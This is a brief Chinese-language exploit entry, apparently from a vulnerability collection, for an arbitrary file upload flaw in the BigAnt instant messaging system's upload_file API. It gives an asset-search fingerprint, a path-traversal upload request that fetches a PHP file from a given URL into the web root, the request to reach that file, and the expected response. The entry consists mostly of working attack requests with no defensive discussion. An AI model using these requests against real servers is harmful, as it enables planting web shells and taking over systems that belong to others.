# 杭州九麒科技BigAnt即时通讯系统upload_file存在任意文件上传漏洞

杭州九麒科技BigAnt即时通讯系统 ｜ 文件上传 ｜ —
- **指纹**：`app="BigAnt-Admin"`
- **请求**：`GET /api/DispersedOrg/upload_file?server_id=1&path=/data/../Application/qaz1.php&file_url=http://127.0.0.1:7676/1.php HTTP/1.1`

**Payload**
```
访问上传的地址
GET /Application/qaz1.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
```
- **响应特征**：200